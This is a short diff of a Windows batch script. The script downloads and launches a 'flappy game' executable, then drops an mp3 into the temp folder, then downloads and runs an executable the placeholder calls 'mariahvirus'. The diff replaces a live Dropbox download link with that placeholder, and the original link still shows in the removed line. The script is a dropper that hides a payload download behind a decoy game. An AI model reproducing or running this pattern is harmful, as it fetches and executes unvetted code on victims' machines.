@@ -17,5 +17,5 @@ Powershell -Command "Invoke-WebRequest -Uri 'link_to_game_exe' -OutFile C:\flapp
 start C:\flappygame.exe
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_aiwfciy_mp3' -OutFile aiwfciy.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/cjezty410q9ggetufwygx/mariahpocalypsequicker.exe?rlkey=e8m5rm33x07evxkct7dv5uy3n&st=er8o771e&dl=1' -OutFile .\mariahpocalypsequicker.exe"
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_mariahvirus_exe' -OutFile .\mariahpocalypsequicker.exe"
 mariahpocalypsequicker.exe
